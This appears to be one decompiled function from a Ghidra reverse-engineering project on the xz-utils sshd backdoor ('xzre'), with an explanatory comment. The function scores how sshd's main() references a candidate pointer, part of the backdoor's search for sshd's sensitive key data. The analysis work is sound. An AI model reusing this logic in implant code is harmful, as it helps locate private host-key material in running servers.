// /home/kali/xzre-ghidra/xzregh/103910_sshd_get_sensitive_data_score_in_main.c
// Function: sshd_get_sensitive_data_score_in_main @ 0x103910
// Calling convention: unknown
// Prototype: undefined sshd_get_sensitive_data_score_in_main(void)


/*
 * AutoDoc: Checks sshd's main() for memory operands that touch the candidate pointer at offsets 0, +8,
 * and +0x10. The heuristic rewards routines that touch the base and +0x10 entries while
 * penalising ones that never reference +8, generating a small signed score that later gets
 * doubled in the aggregate calculation.
 */
#include "xzre_types.h"


undefined1  [16]
sshd_get_sensitive_data_score_in_main
          (long param_1,undefined8 param_2,long param_3,undefined8 param_4)

{
  long lVar1;
  undefined8 uVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  uint uVar6;
  undefined1 auVar7 [16];
  
  uVar6 = 0;
  lVar1 = *(long *)(param_3 + 0x48);
  if (lVar1 != 0) {
    uVar2 = *(undefined8 *)(param_3 + 0x50);
    iVar3 = find_instruction_with_mem_operand(lVar1,uVar2,0,param_1);
    iVar4 = find_instruction_with_mem_operand(lVar1,uVar2,0,param_1 + 0x10);
    iVar5 = find_instruction_with_mem_operand(lVar1,uVar2,0,param_1 + 8);
    uVar6 = (((uint)(iVar3 != 0) - (uint)(iVar4 == 0)) + 2) - (uint)(iVar5 == 0);
  }
  auVar7._4_4_ = 0;
  auVar7._0_4_ = uVar6;
  auVar7._8_8_ = param_4;
  return auVar7;
}

